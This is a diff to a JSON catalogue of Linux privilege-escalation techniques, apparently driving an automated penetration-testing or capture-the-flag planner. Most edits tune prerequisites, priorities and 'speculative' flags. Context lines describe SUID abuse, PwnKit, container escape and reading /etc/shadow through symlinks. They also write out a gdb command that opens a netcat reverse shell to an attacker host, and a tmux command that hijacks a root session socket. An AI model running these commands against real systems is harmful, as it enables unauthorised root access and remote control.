@@ -71,7 +71,8 @@
       "requires_all": [],
       "requires_any": [
         "privesc.sudo_rights",
-        "privesc.sudo_binary"
+        "privesc.sudo_binary",
+        "privesc.script_sink"
       ],
       "deprioritize_when": [
         "access.admin",
@@ -316,6 +317,7 @@
     },
     {
       "id": "suid-gtfobins",
+      "transition": "privesc_act",
       "title": "SUID Binary Abuse",
       "hypothesis": "SUID binaries execute with their owner's identity (typically root). The stock ones (su, sudo, mount) are expected, what you want is the OUTLIER: a custom or out-of-place binary carrying the SUID bit. Check anything unusual against GTFOBins; there are plenty of boxes where find / -perm -4000 alone is the whole path to root.",
       "tool": "sh",
@@ -610,11 +612,11 @@
         "gcc",
         "searchsploit"
       ],
-      "requires_any": [
-        "host.kernel",
-        "foothold.linux",
-        "access.shell"
+      "os": [
+        "linux"
       ],
+      "speculative": true,
+      "requires_any": [],
       "produces": [
         "access.admin"
       ],
@@ -652,7 +654,12 @@
           "note": "Read the source first; compile on a matching box, then run and confirm uid=0."
         }
       ],
-      "requires_all": []
+      "requires_all": [
+        "foothold.linux"
+      ],
+      "deprioritize_when": [
+        "access.admin"
+      ]
     },
     {
       "id": "linux-path-hijack",
@@ -665,10 +672,13 @@
         "strings",
         "ltrace"
       ],
+      "os": [
+        "linux"
+      ],
       "requires_any": [
         "privesc.suid_candidate",
-        "foothold.linux",
-        "access.shell"
+        "privesc.cron",
+        "privesc.cron_writable"
       ],
       "produces": [
         "access.admin"
@@ -707,7 +717,12 @@
           "note": "Run the SUID binary; it resolves the bare name to yours and runs it as root."
         }
       ],
-      "requires_all": []
+      "requires_all": [
+        "foothold.linux"
+      ],
+      "deprioritize_when": [
+        "access.admin"
+      ]
     },
     {
       "id": "linux-ld-preload",
@@ -719,10 +734,11 @@
         "sh",
         "gcc"
       ],
+      "os": [
+        "linux"
+      ],
       "requires_any": [
-        "privesc.sudo_rights",
-        "foothold.linux",
-        "access.shell"
+        "privesc.sudo_rights"
       ],
       "produces": [
         "access.admin"
@@ -761,7 +777,12 @@
           "note": "Confirm the shell is uid 0."
         }
       ],
-      "requires_all": []
+      "requires_all": [
+        "foothold.linux"
+      ],
+      "deprioritize_when": [
+        "access.admin"
+      ]
     },
     {
       "id": "wildcard-injection",
@@ -779,8 +800,7 @@
       ],
       "requires_any": [
         "privesc.cron_writable",
-        "foothold.linux",
-        "access.shell"
+        "privesc.cron"
       ],
       "produces": [
         "access.admin"
@@ -829,7 +849,12 @@
           "note": "7z symlink / wildcard file read: When 7z or tar archives a directory with wildcards (*), creating a symlink to sensitive files (e.g. /etc/shadow or /root/root.txt) stores the symlinked contents inside the archive for unprivileged extraction."
         }
       ],
-      "requires_all": []
+      "requires_all": [
+        "foothold.linux"
+      ],
+      "deprioritize_when": [
+        "access.admin"
+      ]
     },
     {
       "id": "systemd-timer-abuse",
@@ -845,9 +870,9 @@
       "os": [
         "linux"
       ],
+      "speculative": true,
       "requires_any": [
-        "foothold.linux",
-        "access.shell"
+        "foothold.linux"
       ],
       "produces": [
         "access.admin"
@@ -886,7 +911,10 @@
           "note": "Reload and start it, or wait for its timer; uid=0 confirms root."
         }
       ],
-      "requires_all": []
+      "requires_all": [],
+      "deprioritize_when": [
+        "access.admin"
+      ]
     },
     {
       "id": "polkit-abuse",
@@ -895,6 +923,7 @@
       "os": [
         "linux"
       ],
+      "speculative": true,
       "hypothesis": "polkit decides whether an unprivileged process may run a privileged action over D-Bus, and pkexec is its setuid helper. pkexec carried PwnKit (CVE-2021-4034), an instant local root on almost every Linux box for a decade, and policy misconfigurations or the CVE-2021-3560 race let you call privileged D-Bus actions you should not. The tell is simply that pkexec exists unpatched, or a D-Bus service exposes a loosely-policed action. Check the pkexec version first; it is often the fastest root on the box.",
       "tool": "sh",
       "tools": [
@@ -903,8 +932,12 @@
         "busctl"
       ],
       "requires_any": [
-        "foothold.linux",
-        "access.shell"
+        "vuln.polkit",
+        "privesc.kernel_exploit"
+      ],
+      "deprioritize_when": [
+        "access.admin",
+        "access.system"
       ],
       "produces": [
         "access.admin"
@@ -943,7 +976,9 @@
           "note": "uid=0 confirms root; clean up any user you created."
         }
       ],
-      "requires_all": []
+      "requires_all": [
+        "foothold.linux"
+      ]
     },
     {
       "id": "python-library-hijack",
@@ -959,9 +994,9 @@
         "python3"
       ],
       "requires_any": [
-        "foothold.linux",
-        "access.shell",
-        "privesc.cron_writable"
+        "privesc.cron_writable",
+        "privesc.cron",
+        "privesc.sudo_rights"
       ],
       "produces": [
         "access.admin"
@@ -1005,7 +1040,12 @@
           "note": "PyCache / bytecode hijack: When source files are read-only but __pycache__ is writable, overwrite the compiled bytecode (.pyc) to execute commands when root imports {{module}}."
         }
       ],
-      "requires_all": []
+      "requires_all": [
+        "foothold.linux"
+      ],
+      "deprioritize_when": [
+        "access.admin"
+      ]
     },
     {
       "id": "container-escape",
@@ -1014,6 +1054,7 @@
       "os": [
         "linux"
       ],
+      "speculative": true,
       "hypothesis": "A container is not the objective; the node is. A --privileged (or CAP_SYS_ADMIN) container can mount the host disk or abuse cgroups to run on the host; a mounted Docker socket lets you start a container that bind-mounts the host root; and a Kubernetes service-account token with a permissive role lets you create a privileged pod or exec onto a node. The tell is a token under /var/run/secrets, a docker.sock in the mounts, or a capability set that should never be in a container.",
       "tool": "sh",
       "tools": [
@@ -1022,8 +1063,7 @@
         "kubectl"
       ],
       "requires_any": [
-        "foothold.linux",
-        "access.shell"
+        "foothold.linux"
       ],
       "produces": [
         "access.admin"
@@ -1062,7 +1102,10 @@
           "note": "A permissive service-account token lets you create a privileged pod that mounts the host filesystem."
         }
       ],
-      "requires_all": []
+      "requires_all": [],
+      "deprioritize_when": [
+        "access.admin"
+      ]
     },
     {
       "id": "dirtycow",
@@ -1076,11 +1119,16 @@
       "os": [
         "linux"
       ],
+      "speculative": true,
       "phase": "escalate",
       "requires_any": [
-        "foothold.linux",
-        "access.shell",
+        "vuln.dirtycow",
+        "privesc.kernel_exploit",
         "host.kernel"
+      ],
+      "deprioritize_when": [
+        "access.admin",
+        "access.system"
       ],
       "produces": [
         "access.admin"
@@ -1109,7 +1157,9 @@
           "note": "Compile and run on the target; the /etc/passwd variant then lets you su to the new root user."
         }
       ],
-      "requires_all": []
+      "requires_all": [
+        "foothold.linux"
+      ]
     },
     {
       "id": "dirtypipe",
@@ -1123,11 +1173,16 @@
       "os": [
         "linux"
       ],
+      "speculative": true,
       "phase": "escalate",
       "requires_any": [
-        "foothold.linux",
-        "access.shell",
+        "vuln.dirtypipe",
+        "privesc.kernel_exploit",
         "host.kernel"
+      ],
+      "deprioritize_when": [
+        "access.admin",
+        "access.system"
       ],
       "produces": [
         "access.admin"
@@ -1156,7 +1211,9 @@
           "note": "The exploit backs up and rewrites the SUID binary, then hands you a root shell; it restores the original after."
         }
       ],
-      "requires_all": []
+      "requires_all": [
+        "foothold.linux"
+      ]
     },
     {
       "id": "baron-samedit",
@@ -1171,10 +1228,16 @@
       "os": [
         "linux"
       ],
+      "speculative": true,
       "phase": "escalate",
       "requires_any": [
-        "foothold.linux",
-        "access.shell"
+        "vuln.baron_samedit",
+        "privesc.kernel_exploit",
+        "privesc.sudo_rights"
+      ],
+      "deprioritize_when": [
+        "access.admin",
+        "access.system"
       ],
       "produces": [
         "access.admin"
@@ -1208,7 +1271,9 @@
           "note": "Spawns a root shell; no sudo rights are required for your user."
         }
       ],
-      "requires_all": []
+      "requires_all": [
+        "foothold.linux"
+      ]
     },
     {
       "id": "wildcard-symlink-privesc",
@@ -1225,10 +1290,16 @@
       "os": [
         "linux"
       ],
-      "requires_all": [],
-      "requires_any": [
-        "access.shell",
+      "requires_all": [
         "foothold.linux"
+      ],
+      "requires_any": [
+        "privesc.cron",
+        "privesc.cron_wildcard",
+        "privesc.cron_writable"
+      ],
+      "obsoleted_by": [
+        "objective.root_flag"
       ],
       "produces": [
         "objective.root_flag",
@@ -1269,6 +1340,7 @@
       "os": [
         "linux"
       ],
+      "speculative": true,
       "requires_all": [],
       "requires_any": [
         "foothold.linux"
@@ -1329,9 +1401,13 @@
         "linux"
       ],
       "phase": "elevate",
+      "requires_all": [
+        "foothold.linux"
+      ],
       "requires_any": [
-        "foothold.linux",
-        "privesc.lxd_group"
+        "privesc.group_lxd",
+        "privesc.lxd_group",
+        "privesc.container_group"
       ],
       "produces": [
         "access.admin"
@@ -1370,7 +1446,9 @@
           "note": "Starts container and enters interactive root shell with full write access to host /mnt/root."
         }
       ],
-      "requires_all": []
+      "deprioritize_when": [
+        "access.admin"
+      ]
     },
     {
       "id": "gdbserver-remote-execution",
@@ -1412,6 +1490,9 @@
           "run": "gdb -q -ex 'target remote {{target}}:1337' -ex 'call (void)system(\"nc -e /bin/sh {{lhost}} {{lport}}\")'",
           "note": "Execute reverse shell payload via system call injection inside debugged target process."
         }
+      ],
+      "deprioritize_when": [
+        "foothold.linux"
       ]
     },
     {
@@ -1426,6 +1507,7 @@
       "os": [
         "linux"
       ],
+      "speculative": true,
       "requires_all": [],
       "requires_any": [
         "foothold.linux"
@@ -1453,6 +1535,9 @@
           "run": "tmux -S {{socket_path}} attach",
           "note": "Attach to a world-readable root tmux session socket to spawn interactive root prompt."
         }
+      ],
+      "deprioritize_when": [
+        "access.admin"
       ]
     },
     {
@@ -1467,15 +1552,20 @@
       "os": [
         "linux"
       ],
-      "requires_all": [],
+      "requires_all": [
+        "foothold.linux"
+      ],
       "requires_any": [
-        "foothold.linux",
         "vuln.chkrootkit"
+      ],
+      "deprioritize_when": [
+        "access.admin",
+        "access.system"
       ],
       "produces": [
         "access.admin"
       ],
-      "priority": 90,
+      "priority": 74,
       "phase": "escalate",
       "proves": "exploits insecure /tmp/update execution in chkrootkit cron job to gain root privileges",
       "does_not_prove": "system compromise without a scheduled cron invocation",
@@ -1512,14 +1602,23 @@
       "os": [
         "linux"
       ],
-      "requires_all": [],
-      "requires_any": [
+      "speculative": true,
+      "requires_all": [
         "foothold.linux"
+      ],
+      "requires_any": [
+        "privesc.sudo",
+        "privesc.sudo_binary",
+        "privesc.sudo_rights"
+      ],
+      "deprioritize_when": [
+        "access.admin",
+        "access.system"
       ],
       "produces": [
         "access.admin"
       ],
-      "priority": 90,
+      "priority": 72,
       "phase": "escalate",
       "proves": "exploits sudo npm install permissions to execute commands as root via package preinstall lifecycle hook",
       "does_not_prove": "privilege escalation without sudo npm privileges",
@@ -1557,16 +1656,20 @@
       "os": [
         "linux"
       ],
-      "requires_all": [],
-      "requires_any": [
-        "vuln.screen_suid",
-        "privesc.suid_candidate",
+      "requires_all": [
         "foothold.linux"
+      ],
+      "requires_any": [
+        "vuln.screen_suid"
+      ],
+      "deprioritize_when": [
+        "access.admin",
+        "access.system"
       ],
       "produces": [
         "access.admin"
       ],
-      "priority": 92,
+      "priority": 74,
       "phase": "escalate",
       "proves": "root shell access via GNU Screen 4.5.0 SUID ld.so.preload privilege escalation",
       "does_not_prove": "kernel-level root exploitation on patched screen versions",
